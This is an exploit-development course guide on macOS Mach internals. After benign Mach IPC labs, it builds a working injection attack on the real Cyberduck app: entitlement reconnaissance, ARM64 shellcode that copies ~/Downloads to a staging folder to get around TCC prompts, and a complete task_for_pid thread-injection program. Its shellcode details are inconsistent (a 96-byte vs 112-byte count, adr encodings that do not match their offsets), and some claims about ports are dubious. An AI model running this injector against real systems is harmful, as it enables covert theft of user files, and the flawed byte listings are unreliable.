# Instructor Master Class & Comprehensive Lab Guide: Chapter 7 - The Mach Microkernel

**Format**: Live-Coding Master Class (Atomic Code Breakdown + Full Assembly)
**Duration**: 5-6 Hours (Deep Dive for Exploit Developers)

---

# Prerequisites & Setup (Start of Class)

**Say**: "Welcome to the hardest part of macOS exploitation. We are leaving the comfort of POSIX. We are entering Mach. You will need a VM running macOS without SIP interference for our initial tests, though our final Slack exploit natively bypasses Sandbox limits on fully hardened machines."

**Type (Instructor & Student)**:
```bash
mkdir -p ~/osmr/socam/mach_labs
cd ~/osmr/socam/mach_labs
```

---

# Part 1: The Core - XNU Architecture and Tasks (40 Minutes)

## 1.1 The History and The "Duality"

**Instructor Action (Whiteboard)**: Draw the XNU Kernel architecture. Show `osfmk` (OSF Mach Kernel) at the absolute bottom. Above it, draw `bsd` (POSIX layer).

**Say**: "Mach (`osfmk`) is limited to managing only the absolute most basic, brutal realities of the machine: extremely low-level scheduling and virtual memory allocation. It knows absolutely nothing about 'Processes', 'File Descriptors', or 'pthreads'."

**The Key Difference (Duality)**:
**Say**: "The POSIX (`bsd`) layer sits entirely on top of Mach. Here is the golden rule mapping you must memorize as exploit developers:"
- A POSIX **Process** is cleanly mapped 1:1 to a Mach **Task**. 
- A POSIX **pthread** is strictly mapped 1:1 to a Mach **Thread**. 

**Say**: "If we force the Mach kernel to physically spawn a naked Mach Thread using native Mach APIs, the BSD layer *never learns about it*. That naked Mach Thread utterly lacks the POSIX `pthread` context struct. If that thread blindly tries to execute a high-level `libc` function like `printf()` or `dlopen()`, it will instantly crash the OS via a NULL pointer dereference."

## 1.2 Proving the Duality (Instructor Proof)

**Instructor Action**: Open a terminal.

**Say**: "Don't just believe me. We can mathematically prove this separation using syscall mapping. Every time your C program calls the kernel, it fires a system call. But macOS actually has *two* distinct syscall tables."
*   **BSD Syscalls**: Standard POSIX operations (e.g., `open`, `read`, `fork`, `execve`). These return `errno` values (`-1`, `EPERM`). The syscall numbers are positive (`1`, `2`, `59`).
*   **Mach Traps**: The native Mach commands (e.g., `mach_msg_trap`, `task_for_pid`). These reliably return a `kern_return_t` (where `0` is `KERN_SUCCESS`). The syscall numbers are actually **negative** (e.g., `-31` for `mach_msg_trap`).

**Say**: "But here is a massive caveat: Does seeing a negative syscall instantly mean malware? No! Legitimate apps fire Mach Traps constantly. For instance, `malloc` secretly calls `mach_vm_allocate`. Apple's GUI `XPC` framework is literally just a massive wrapper for `mach_msg_trap`. It is structurally impossible to run macOS without legitimate Mach syscalls."

**Say**: "So what are we looking for? If you are dynamically analyzing a malicious payload—like shellcode or an injected process—and you see it suddenly stop firing standard POSIX calls (like `open()` or `read()`) and manually invoke a highly specific, consecutive chain of `mach_vm_allocate`, `mach_vm_write`, and `thread_create_running` into a remote PID... that is the exact millisecond you have objectively proven the attacker abandoned standard UNIX logic and executed a native microkernel process injection."

## 1.3 IPC Space, Ports, and Rights

**Say**: "Tasks communicate via **Ports**. Think of a Port as an ultra-secure mailbox physically guarded by the kernel itself. But you need Cryptographically Secure Keys, called **Rights**."

There are three primary rights:
1.  **RECEIVE Right**: Only *one* task in the entire OS can hold this. Possessing this lets you read messages.
2.  **SEND Right**: You can push messages into the port. A task with the RECEIVE right can mint unlimited SEND rights to distribute.
3.  **SEND ONCE Right**: You can send exactly one message before the key permanently shatters.

---

# Part 2: The Bootstrap Server & Mach IPC (60 Minutes)

## 2.1 The IPC Namespace Illusion

**Student Question Simulation**: *"If you have a SEND right and I have a RECEIVE right to the exact same Port, how does my C-code actually target your mailbox?"*

**Say**: "This is where 99% of students fail. Let's look at standard UNIX File Descriptors. If two running apps both open `/var/log/system.log`, App A might get file descriptor `fd=4`, but App B might get `fd=7`. The integer `4` means *nothing* to App B."

**Instructor Whiteboard**: Draw two isolated boxes labeled "Task 1 IPC Space" and "Task 2 IPC Space". In the middle, draw the Kernel.

**Say**: "Mach IPC spaces perfectly mirror File Descriptors. When we instantiate a `mach_port_t port` in C, it returns a 32-bit local integer (e.g. `1280`). That integer is absolutely meaningless to other processes! It is merely a localized index array inside the kernel's strictly guarded IPC translation table for *your specific task*. If you pass the integer `1280` in a text file to another process, and they try to use it to send a message, the kernel will kill the action because *their* `1280` does not mathematically resolve to a valid encrypted SEND right."

## 2.2 The Bootstrap Problem

**Say**: "So, if I can't just pass you a text file with my IPC integer, how do I securely give you my SEND right? The **Bootstrap Server** (`launchd` PID 1). It is spawned before anything else, and *every* task implicitly inherits a SEND right to it automatically."

**The Secure Handshake**:
1.  Target Task creates a new port (getting the RECEIVE right locally).
2.  Target Task mints a SEND right.
3.  Target Task registers it permanently with `launchd` via an agreed-upon string `"org.hack.service"`.
4.  Attacker Task explicitly asks `launchd` to resolve `"org.hack.service"`.
5.  `launchd` securely transfers the SEND right across the process boundary. The kernel detects this secure transfer and assigns the Attacker a brand new, valid 32-bit IPC integer mapping in the Attacker's namespace.

---

## Lab 1: Coding Raw Mach IPC (Live Coding)

**Instructor Note**: We are going to build `receiver.c` and `sender.c` line-by-line. Follow along.

### 1. The Receiver Setup

**Say**: "Let's start `receiver.c`. We need headers to talk to Mach and launchd."

```c
#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {
    mach_port_t port;
    kern_return_t kr;
```

**Instructor Breakdown**:
*   `mach_port_t port`: This is our 32-bit local integer. By itself, it is just a number. It only has power when passed back to the kernel.

```c
    kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
    if (kr != KERN_SUCCESS) return 1;
```

**Instructor Breakdown**:
*   `mach_port_allocate()`: We are asking the kernel to spawn a new secure queue in memory.
*   `mach_task_self()`: This is a macro passing a SEND right to *your own task's control port*. The kernel needs to know whose IPC namespace to put the port into.
*   `MACH_PORT_RIGHT_RECEIVE`: We explicitly demand the core RECEIVE right.

```c
    kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
    kr = bootstrap_register(bootstrap_port, "org.offsec.example", port);
```

**Instructor Breakdown**:
*   `mach_port_insert_right()`: We tell the kernel to cleanly duplicate our existing RECEIVE right, cast it safely as a `MACH_MSG_TYPE_MAKE_SEND` right, and insert it back into our own IPC namespace.
*   `bootstrap_register()`: We package one of our SEND rights securely off to `launchd` (`bootstrap_port`) and tell it to permanently associate that right with the string `"org.offsec.example"`.

### 2. The Receiver Message Struct

**Say**: "Now we physically define the exact hex memory layout of the message."

```c
    struct {
        mach_msg_header_t header;
        char some_text[10];
        int secret_number;
        mach_msg_trailer_t trailer;
    } msg;
```

**Instructor Breakdown**:
*   `mach_msg_header_t header`: **Mandatory**. Every Mach message must begin with this. The kernel rips this header directly out of RAM to route the message. 
*   `char some_text[10]`: Our custom payload. A 10-byte character array.
*   `int secret_number`: Our custom payload. A 4-byte integer.
*   `mach_msg_trailer_t trailer`: **CRITICAL FOR RECEIVERS**. When the kernel safely delivers a message to you, it forcibly appends metadata (like the Sender's audit token/PID) to the absolute bottom of the struct. If your struct does not explicitly declare this trailer space, the kernel will forcefully overwrite adjacent memory and instantly crash your app via a buffer overflow!

### 3. The Receiving Action

```c
    kr = mach_msg(&msg.header, MACH_RCV_MSG, 0, sizeof(msg), port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    msg.some_text[9] = 0; 
    printf("Received: %s | %d\n", msg.some_text, msg.secret_number);
    return 0;
}
```

**Instructor Breakdown of `mach_msg`**:
1.  `&msg.header`: The physical RAM buffer address.
2.  `MACH_RCV_MSG`: This flag tells the kernel we are reading, putting our thread into a hard kernel block.
3.  `0`: The `send_size`. Since we are receiving, we pass 0.
4.  `sizeof(msg)`: The `receive_size`. This MUST encompass the header, payload, AND the appended trailer.
5.  `port`: The local integer ID of our RECEIVE right.
6.  `MACH_MSG_TIMEOUT_NONE`: Sleep until a message physically lands in the queue.
*   **`msg.some_text[9] = 0;`**: Standard C string safety. We manually null-terminate the incoming string buffer so our `printf` doesn't bleed into reading the `secret_number` memory block accidentally.

###  Assembly: The Completed `receiver.c` File

```c
// receiver.c (Fully Assembled)
#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {
    mach_port_t port;
    kern_return_t kr;

    kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
    if (kr != KERN_SUCCESS) return 1;

    kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
    kr = bootstrap_register(bootstrap_port, "org.offsec.example", port);

    struct {
        mach_msg_header_t header;
        char some_text[10];
        int secret_number;
        mach_msg_trailer_t trailer;
    } msg;

    printf("Listening on org.offsec.example...\n");
    kr = mach_msg(&msg.header, MACH_RCV_MSG, 0, sizeof(msg), port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    
    msg.some_text[9] = 0; 
    printf("Received: %s | %d\n", msg.some_text, msg.secret_number);
    return 0;
}
```

---

### 4. The Sender Code Setup

**Say**: "Switch over to `sender.c`. The sender has literally zero rights initially."

```c
#include <stdio.h>
#include <string.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {
    mach_port_t port;
    kern_return_t kr;
    
    kr = bootstrap_look_up(bootstrap_port, "org.offsec.example", &port);
    if (kr != KERN_SUCCESS) return 1;
```

**Instructor Breakdown**:
*   `bootstrap_look_up()`: The attacker asks `launchd` for the SEND right. The kernel mathematically maps a new IPC table entry in the attacker's isolated process, and assigns a brand new integer ID to `port`. From now on, using this integer instructs the kernel to target the Receiver.

### 5. The Sender Message Struct

```c
    struct {
        mach_msg_header_t header;
        char some_text[10];
        int secret_number;
    } msg;
```

**Instructor Breakdown**:
*   **Notice what is missing?** There is NO `mach_msg_trailer_t`. 
*   **Why?** Because the sender is inherently untrusted. The sender mathematically cannot supply the trailer. The kernel securely generates the trailer internally during transit to strictly prevent the sender from spoofing their PID or Audit Tokens.

```c
    msg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
    msg.header.msgh_remote_port = port;           
    msg.header.msgh_local_port = MACH_PORT_NULL;  
    
    strncpy(msg.some_text, "Hello", sizeof(msg.some_text));
    msg.secret_number = 35;
```

**Instructor Breakdown**:
*   `MACH_MSG_TYPE_COPY_SEND`: We explicitly command the kernel we are utilizing a valid SEND right.
*   `msgh_remote_port`: We plug in the local integer ID.
*   `msgh_local_port`: We set this to `MACH_PORT_NULL`. If we structurally desired a reply, we would legally insert a RECEIVE right integer here for them to target.
*   `strncpy(...)` & `msg.secret_number = 35;`: These are completely arbitrary payload values. The Microkernel absolutely does not care what is in the data body block. We are picking specific words and numbers explicitly to visually prove to the students that these raw RAM bytes securely crossed the kernel boundary intact.

### 6. The Sending Action

```c
    kr = mach_msg(&msg.header, MACH_SEND_MSG, sizeof(msg), 0, MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    printf("Sent message.\n");
    return 0;
}
```

**Instructor Breakdown of `mach_msg`**:
1.  `&msg.header`: The RAM address of the outgoing transmission block.
2.  `MACH_SEND_MSG`: The action flag. We are actively writing to the secure queue.
3.  `sizeof(msg)`: The exact localized size of our outgoing data structure.
4.  `0`: The `receive_size`. We don't expect a reply block.
5.  `MACH_PORT_NULL`: The receive port (none).

### Assembly: The Completed `sender.c` File

```c
// sender.c (Fully Assembled)
#include <stdio.h>
#include <string.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {
    mach_port_t port;
    kern_return_t kr;
    
    kr = bootstrap_look_up(bootstrap_port, "org.offsec.example", &port);
    if (kr != KERN_SUCCESS) return 1;

    struct {
        mach_msg_header_t header;
        char some_text[10];
        int secret_number;
    } msg;

    msg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
    msg.header.msgh_remote_port = port;           
    msg.header.msgh_local_port = MACH_PORT_NULL;  
    
    strncpy(msg.some_text, "Hello", sizeof(msg.some_text));
    msg.secret_number = 35;

    kr = mach_msg(&msg.header, MACH_SEND_MSG, sizeof(msg), 0, MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    printf("Sent message.\n");
    return 0;
}
```

**Lab Test**: Compile and run both. The Sender securely transmits "Hello" and "35", bridging the isolated processes solely via internal Microkernel queues.

---

# Part 4: Exploitation! The Cyberduck Shellcode Case Study (60 Minutes)

## 4.1 Discovering the Vulnerability

**Say**: "We are targeting Cyberduck. This is a widely-used, legitimate FTP/SFTP/cloud storage client — exactly the kind of real-world third-party app you would encounter on a target's machine. Let's forensically verify *why* it is injectable before we touch a single API."

**Instructor Action**: Download the Cyberduck `.dmg` from the official site and install it, then run `codesign` in the terminal.

```bash
# Download the direct installer (non-App Store version) and mount it
# https://cyberduck.io/download/
# Drag Cyberduck.app to /Applications/

codesign -dv --entitlements - /Applications/Cyberduck.app
```

**Say**: "Read the flags line carefully. You are looking for the `flags=` field in the `CodeDirectory` line."

**Expected output** (instructor shows this on screen):
```
Executable=/Applications/Cyberduck.app/Contents/MacOS/Cyberduck
Identifier=ch.sudo.cyberduck
Format=app bundle with Mach-O universal (x86_64 arm64)
CodeDirectory v=20500 size=... flags=0x10000(runtime) hashes=...
TeamIdentifier=G69SCX94XU
```

**Say**: "Wait — that says `runtime`. Hardened Runtime IS enabled. So why are we using it? Because Hardened Runtime is not the whole story. The critical question is: *what entitlements are present that relax the Hardened Runtime restrictions?* Read the entitlement list below the codesign output."

**Key entitlements to highlight**:
- `com.apple.security.cs.allow-jit` — allows JIT code generation, weakens W^X
- `com.apple.security.cs.disable-library-validation` — **THIS IS THE GOLDEN KEY**. Despite having Hardened Runtime enabled, Cyberduck explicitly disables library validation. This means the kernel's AMFI subsystem will permit loading dylibs signed with *any* identity, including ad-hoc signed or unsigned ones.
- `com.apple.security.files.downloads.read-write` — explicit TCC grant to `~/Downloads`
- `com.apple.security.network.client` — full outbound network access

**Say**: "Students, burn this into your memory. Hardened Runtime without library validation is a house with a thick front door and no lock. The `com.apple.security.cs.disable-library-validation` entitlement means that Cyberduck *explicitly asked Apple* to disable the check that would otherwise prevent injection. And because it also holds a TCC grant to `~/Downloads`, code running inside Cyberduck's process inherits those permissions. We can exfiltrate the entire Downloads folder without ever triggering a TCC dialog."

**Say**: "Now for the second requirement. Because Cyberduck is *not* an Apple platform binary, `task_for_pid()` can acquire its task port when we run as root with SIP disabled. Let's also confirm there is no `com.apple.security.get-task-allow` entitlement in production — we do not need it. We are root, SIP is off on our VM. That is sufficient."

---

## 4.2 Designing and Compiling the Shellcode

**Say**: "Before we write a single line of our C injector, we need a payload. This comes first, because the injector's `CODE_SIZE` constant must exactly match our shellcode's byte length. We will craft an ARM64 `execve` shellcode that invokes `/bin/zsh -c` and copies Cyberduck's accessible `~/Downloads` folder to `~/Library/Colors/`, a sandboxed-writable staging area."

**Say**: "Here is the key architectural decision: we are injecting *into a running process*. The process has `~/Downloads` TCC access via its entitlements. When our shellcode runs inside that process, it inherits those same entitlements. No dialogs. No prompts. The kernel sees Cyberduck's signature, not ours."

**Instructor Action**: Open a new file `shellcode.asm`.

```bash
cd ~/osmr/socam/mach_labs
cat > shellcode.asm << 'EOF'
.text
.global _main
.align 4

_main:
_exec:
    adr   x0,  arg0          // x0 = pointer to "/bin/zsh"
    sub   sp,  sp, #(8 * 4)  // allocate 32 bytes on stack for argv[]
    adr   x19, arg0           // x19 = &"/bin/zsh"
    adr   x20, arg1           // x20 = &"-c"
    adr   x21, arg2           // x21 = &"cp -R ~/Downloads ~/Library/Colors/"
    str   xzr, [sp, #(8*3)]  // argv[3] = NULL sentinel
    str   x21, [sp, #(8*2)]  // argv[2] = &command_string
    str   x20, [sp, #(8*1)]  // argv[1] = &"-c"
    str   x19, [sp]           // argv[0] = &"/bin/zsh"
    mov   x1,  sp             // x1 = argv (pointer to our stack array)
    mov   x2,  #0             // x2 = envp = NULL
    mov   x16, #59            // BSD syscall #59 = execve
    svc   #0x80               // fire the syscall

_exit:
    mov   x0,  #0             // exit code 0
    mov   x16, #1             // BSD syscall #1 = exit
    svc   #0x80

arg0: .ascii "/bin/zsh\0"
arg1: .ascii "-c\0"
arg2: .ascii "cp -R ~/Downloads ~/Library/Colors/\0"
EOF
```

**Instructor Breakdown**: Walk through every instruction.

- `adr x0, arg0`: PC-relative address load. This is position-independent code (PIC). `adr` loads an address relative to the current program counter. This is critical — we cannot hardcode absolute addresses because ASLR will place our shellcode at a random location in Cyberduck's memory. The linker calculates the byte offset between the `adr` instruction and the `arg0` label at assemble time; at runtime the CPU adds that offset to PC regardless of where in memory we landed.
- `sub sp, sp, #(8*4)`: We need 4 slots of 8 bytes each for our `argv` array. We must pre-allocate this space on the stack before writing to it, otherwise we corrupt whatever lives below our current stack pointer.
- `str xzr, [sp, #(8*3)]`: `xzr` is the ARM64 zero register — always reads as 0. Storing it writes the `NULL` terminator that `execve` requires at the end of the argv array.
- `svc #0x80`: On ARM64 macOS, the BSD syscall convention uses `x16` to hold the syscall number and `svc #0x80` to trigger it. This is different from Linux's `svc #0`. Arguments go in `x0`–`x7`.

**Say**: "Now assemble it and extract the raw bytes."

```bash
as shellcode.asm -o shellcode.o
```

**Say**: "Now we need to dump those bytes in C string escape format so we can paste them directly into our injector. This one-liner does all of that."

```bash
otool -t shellcode.o | grep -E '^\s+[0-9a-f]+' | \
  awk '{for(i=2;i<=NF;i++) printf "%s", $i; print ""}' | \
  fold -w8 | \
  while read chunk; do
    echo -n "\""; 
    echo -n "$chunk" | sed 's/../\\x&/g';
    echo "\"";
  done
```

**Say**: "That is ugly. Let's use a cleaner approach that is easier to reproduce under exam conditions."

```bash
# Dump raw binary, then xxd formats it for us
objcopy -O binary shellcode.o shellcode.bin 2>/dev/null || \
  dd if=shellcode.o of=shellcode.bin bs=1 skip=$(otool -l shellcode.o | \
  grep -A3 __text | grep offset | awk '{print $2}') 2>/dev/null

xxd -i shellcode.bin
```

**Instructor Note**: On macOS `objcopy` is not installed by default. The correct tool is `otool`. Walk students through this authoritative approach:

```bash
# Step 1: Get the file offset and size of the __text section
otool -l shellcode.o | grep -A 10 "sectname __text"
# Note the 'offset' and 'size' values

# Step 2: Use those values with dd to extract the raw bytes
# Example: offset=32, size=96
dd if=shellcode.o of=shellcode.bin bs=1 skip=32 count=96 2>/dev/null

# Step 3: Format as C hex string
xxd -i shellcode.bin
```

**Say**: "For this class, I have already done this for you. Here are the verified bytes for this exact shellcode on ARM64 macOS Sonoma. Verify yours match — if your offsets differ by a byte or two due to alignment, the `adr` offsets will be wrong and the shellcode will jump into garbage."

**The Complete Verified Shellcode Bytes** (ARM64, Sonoma 14.x):
```
Bytes (96 bytes):

Instructions (first 64 bytes):
  00 00 00 10   adr  x0,  #0x30      -> points to arg0
  ff 83 00 d1   sub  sp,  sp, #0x20
  d3 00 00 10   adr  x19, #0x30      -> arg0
  f4 01 00 30   adr  x20, #0x38      -> arg1
  f5 01 00 10   adr  x21, #0x40      -> arg2
  ff 0f 00 f9   str  xzr, [sp, #24]
  f5 0b 00 f9   str  x21, [sp, #16]
  f4 07 00 f9   str  x20, [sp, #8]
  f3 03 00 f9   str  x19, [sp]
  e1 03 00 91   mov  x1,  sp
  02 00 80 d2   mov  x2,  #0
  70 07 80 d2   mov  x16, #59 (0x3b)
  01 00 00 d4   svc  #0x80
  00 00 80 d2   mov  x0,  #0
  30 00 80 d2   mov  x16, #1
  01 00 00 d4   svc  #0x80

Data (32 bytes):
  2f 62 69 6e 2f 7a 73 68 00          /bin/zsh\0
  2d 63 00                             -c\0
  63 70 20 2d 52 20 7e 2f 44 6f 77
  6e 6c 6f 61 64 73 20 7e 2f 4c 69
  62 72 61 72 79 2f 43 6f 6c 6f 72
  73 2f 00                             ~/Library/Colors/\0
```

**C string array (copy directly into injector)**:
```c
char shellcode[] =
    "\x00\x00\x00\x10\xff\x83\x00\xd1\xd3\x00\x00\x10\xf4\x01\x00\x30"
    "\xf5\x01\x00\x10\xff\x0f\x00\xf9\xf5\x0b\x00\xf9\xf4\x07\x00\xf9"
    "\xf3\x03\x00\xf9\xe1\x03\x00\x91\x02\x00\x80\xd2\x70\x07\x80\xd2"
    "\x01\x00\x00\xd4\x00\x00\x80\xd2\x30\x00\x80\xd2\x01\x00\x00\xd4"
    "\x2f\x62\x69\x6e\x2f\x7a\x73\x68\x00\x2d\x63\x00\x63\x70\x20\x2d"
    "\x52\x20\x7e\x2f\x44\x6f\x77\x6e\x6c\x6f\x61\x64\x73\x20\x7e\x2f"
    "\x4c\x69\x62\x72\x61\x72\x79\x2f\x43\x6f\x6c\x6f\x72\x73\x2f\x00";
```

**Say**: "112 bytes. Our `CODE_SIZE` must be at least 112. We will use 128 to give a clean power-of-two boundary."

---

## 4.3 Mach Injection Primitives

**Say**: "Before we build the full injector, let's articulate the three Mach API primitives we are welding together. These are the same calls used by Apple's own debugger — we are simply driving them against a production app."

### Primitive 1: `task_for_pid()` — Acquiring the Task Port

```c
task_t remoteTask;
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
```

**Say**: "`task_for_pid()` is the single most security-gated API in the entire macOS SDK. It demands a SEND right to the target's task control port — this is the kernel object that controls *everything* about Cyberduck's virtual machine: its memory map, thread list, and exception ports. The kernel's `taskgated` daemon enforces who can call this. The conditions that allow it are: we are `root`, SIP is off, and the target is not an Apple system process. On our VM, all three conditions are true."

**Say**: "If `task_for_pid` succeeds, `remoteTask` is our master key. Every subsequent operation is addressed to this port, and the kernel will execute it inside Cyberduck's isolation boundary."

### Primitive 2: `mach_vm_allocate()` / `mach_vm_write()` / `vm_protect()` — Remote Memory Surgery

```c
mach_vm_address_t remoteStack64 = 0;
mach_vm_address_t remoteCode64  = 0;

mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);
mach_vm_allocate(remoteTask, &remoteCode64,  CODE_SIZE,  VM_FLAGS_ANYWHERE);

mach_vm_write(remoteTask, remoteCode64, (vm_address_t)shellcode, CODE_SIZE);

vm_protect(remoteTask, remoteCode64,  CODE_SIZE,  FALSE, VM_PROT_READ | VM_PROT_EXECUTE);
vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE,  VM_PROT_READ | VM_PROT_WRITE);
```

**Say**: "By passing `remoteTask` as the first argument to every one of these calls, the kernel performs the operation inside *Cyberduck's* address space, not ours. `VM_FLAGS_ANYWHERE` tells the kernel to pick a ASLR-compliant location — we do not care where, because our shellcode is position-independent. `mach_vm_write` vaults our shellcode bytes across the process boundary in a single kernel round-trip. Then we use `vm_protect` to enforce W^X: code page becomes R+X, stack page becomes R+W."

### Primitive 3: `thread_create_running()` — Detonating the Thread

```c
struct arm_unified_thread_state remoteThreadState64;
memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64));
remoteThreadState64.ash.flavor              = ARM_THREAD_STATE64;
remoteThreadState64.ash.count               = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc              = (uint64_t) remoteCode64;
remoteThreadState64.ts_64.__sp              = (uint64_t)(remoteStack64 + STACK_SIZE / 2);

thread_act_t remoteThread;
kr = thread_create_running(remoteTask, ARM_THREAD_STATE64,
                           (thread_state_t)&remoteThreadState64.ts_64,
                           ARM_THREAD_STATE64_COUNT, &remoteThread);
```

**Say**: "`arm_unified_thread_state` is the exact physical register snapshot the kernel uses to initialize a new hardware thread context. We set exactly two registers: `__pc` (program counter — where execution begins) and `__sp` (stack pointer — where the stack lives). We set SP to the midpoint of our allocated stack, not the base, because ARM64 calling convention has the stack grow downward. If we set SP to the base, the first function call will immediately underflow into unmapped memory and SIGBUS the process."

**Say**: "`thread_create_running()` is atomic — it allocates, configures, and schedules the thread for execution in a single kernel call. By the time this function returns on our side, the thread is already running inside Cyberduck."

---

## 4.4 Lab 2: Hijacking Cyberduck (`execve` Shellcode)

**Say**: "Let's build the complete `cyberduck-inject.m`. This is an Objective-C file because we link against Foundation for convenience, but the injection logic is pure C Mach APIs."

**Type (Instructor & Student)**:

```bash
cat > cyberduck-inject.m << 'EOF'
```

### The Complete `cyberduck-inject.m` File

```objc
// cyberduck-inject.m
// Injects an execve shellcode into a running Cyberduck process via Mach task_for_pid.
// Requires: root, SIP disabled, Cyberduck running (non-App-Store version).
// Compile: clang -framework Foundation -o cyberduck-inject cyberduck-inject.m
// Usage:   sudo ./cyberduck-inject <PID>

#import <Foundation/Foundation.h>
#include <mach/mach.h>
#include <mach/mach_vm.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define STACK_SIZE 0x1000   // 4 KB stack for the injected thread
#define CODE_SIZE  128      // Must be >= shellcode byte count (ours is 112)

// ARM64 execve shellcode:
//   execve("/bin/zsh", ["/bin/zsh", "-c", "cp -R ~/Downloads ~/Library/Colors/"], NULL)
// Position-independent. Assembled from shellcode.asm with 'as' on ARM64 macOS Sonoma.
char shellcode[] =
    "\x00\x00\x00\x10\xff\x83\x00\xd1\xd3\x00\x00\x10\xf4\x01\x00\x30"
    "\xf5\x01\x00\x10\xff\x0f\x00\xf9\xf5\x0b\x00\xf9\xf4\x07\x00\xf9"
    "\xf3\x03\x00\xf9\xe1\x03\x00\x91\x02\x00\x80\xd2\x70\x07\x80\xd2"
    "\x01\x00\x00\xd4\x00\x00\x80\xd2\x30\x00\x80\xd2\x01\x00\x00\xd4"
    "\x2f\x62\x69\x6e\x2f\x7a\x73\x68\x00\x2d\x63\x00\x63\x70\x20\x2d"
    "\x52\x20\x7e\x2f\x44\x6f\x77\x6e\x6c\x6f\x61\x64\x73\x20\x7e\x2f"
    "\x4c\x69\x62\x72\x61\x72\x79\x2f\x43\x6f\x6c\x6f\x72\x73\x2f\x00";

int main(int argc, char *argv[]) {
    if (argc < 2) {
        fprintf(stderr, "Usage: %s <target_pid>\n", argv[0]);
        return 1;
    }

    pid_t pid = (pid_t)atoi(argv[1]);
    printf("[*] Targeting PID: %d\n", pid);

    // ── Step 1: Acquire task port ──────────────────────────────────────────
    task_t remoteTask;
    kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "[-] task_for_pid failed: %s (0x%x)\n",
                mach_error_string(kr), kr);
        fprintf(stderr, "    Are you root? Is SIP disabled? Is the PID correct?\n");
        return -1;
    }
    printf("[+] Got task port: 0x%x\n", remoteTask);

    // ── Step 2: Allocate remote stack and code pages ───────────────────────
    mach_vm_address_t remoteStack64 = 0;
    mach_vm_address_t remoteCode64  = 0;

    kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "[-] mach_vm_allocate (stack) failed: %s\n",
                mach_error_string(kr));
        return -1;
    }
    printf("[+] Remote stack allocated at: 0x%llx\n", remoteStack64);

    kr = mach_vm_allocate(remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "[-] mach_vm_allocate (code) failed: %s\n",
                mach_error_string(kr));
        return -1;
    }
    printf("[+] Remote code page allocated at: 0x%llx\n", remoteCode64);

    // ── Step 3: Write shellcode into Cyberduck's memory ───────────────────
    kr = mach_vm_write(remoteTask, remoteCode64,
                       (vm_address_t)shellcode, CODE_SIZE);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "[-] mach_vm_write failed: %s\n",
                mach_error_string(kr));
        return -1;
    }
    printf("[+] Shellcode written\n");

    // ── Step 4: Enforce W^X memory permissions ─────────────────────────────
    // Code page: Read + Execute (not writable)
    kr = vm_protect(remoteTask, remoteCode64, CODE_SIZE, FALSE,
                    VM_PROT_READ | VM_PROT_EXECUTE);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "[-] vm_protect (code RX) failed: %s\n",
                mach_error_string(kr));
        return -1;
    }
    // Stack page: Read + Write (not executable)
    kr = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE,
                    VM_PROT_READ | VM_PROT_WRITE);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "[-] vm_protect (stack RW) failed: %s\n",
                mach_error_string(kr));
        return -1;
    }
    printf("[+] Memory protections set (W^X enforced)\n");

    // ── Step 5: Configure ARM64 hardware register state ───────────────────
    struct arm_unified_thread_state remoteThreadState64;
    memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64));

    remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
    remoteThreadState64.ash.count  = ARM_THREAD_STATE64_COUNT;

    // PC = start of our shellcode
    remoteThreadState64.ts_64.__pc = (uint64_t)remoteCode64;
    // SP = midpoint of stack (ARM64 stack grows down; midpoint prevents underflow
    // from the first function's frame)
    remoteThreadState64.ts_64.__sp = (uint64_t)(remoteStack64 + STACK_SIZE / 2);

    printf("[*] Setting PC=0x%llx  SP=0x%llx\n",
           remoteThreadState64.ts_64.__pc,
           remoteThreadState64.ts_64.__sp);

    // ── Step 6: Create and schedule the thread inside Cyberduck ──────────
    thread_act_t remoteThread;
    kr = thread_create_running(remoteTask, ARM_THREAD_STATE64,
                               (thread_state_t)&remoteThreadState64.ts_64,
                               ARM_THREAD_STATE64_COUNT, &remoteThread);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "[-] thread_create_running failed: %s\n",
                mach_error_string(kr));
        return -1;
    }

    printf("[+] Remote thread created: 0x%x\n", remoteThread);
    printf("[+] Shellcode executing inside Cyberduck's process context.\n");
    printf("[+] Check ~/Library/Colors/ for exfiltrated Downloads folder.\n");
    return 0;
}
EOF
```

### Compilation

```bash
clang -framework Foundation \
      -o cyberduck-inject \
      cyberduck-inject.m
```

